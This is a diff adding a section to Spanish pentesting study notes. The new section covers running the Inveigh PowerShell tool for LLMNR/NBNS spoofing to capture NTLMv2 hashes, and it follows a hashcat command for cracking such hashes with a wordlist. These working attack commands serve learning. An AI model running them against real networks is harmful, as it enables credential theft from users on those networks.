@@ -21,3 +21,21 @@ El hash que se captura en el paso anterior es un hash NTMLv2 ( [Hashcat example 
 ```bash
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
+
+## **Inveigh**
+
+[Inveigh](https://github.com/Kevin-Robertson/Inveigh) Sería la herramienta equivalente a `responder` en Windows, pero está escrita en Powershell y C#. Se puede usar cualquiera de las dos versiones
+
+### Versión powershell
+
+Podemos ver los parámetros que quedan por defecto [aquí](https://github.com/Kevin-Robertson/Inveigh#parameter-help). Para ejecutarlo con envenenamiento LLMNR y NBNS podemos escribir lo siguiente:
+
+```powershell
+Import-Module .\\Inveigh.ps1
+# podemos ver los parámetros escribiendo lo siguiente
+(Get-Command Invoke-Inveigh).Parameters
+# Ejecución con spoofing LLMNR y NBNS 
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+El output de los HASH NTMLv2 quedaría en un archivo en la misma carpeta llamado `Inveigh-NTLMv2.txt`
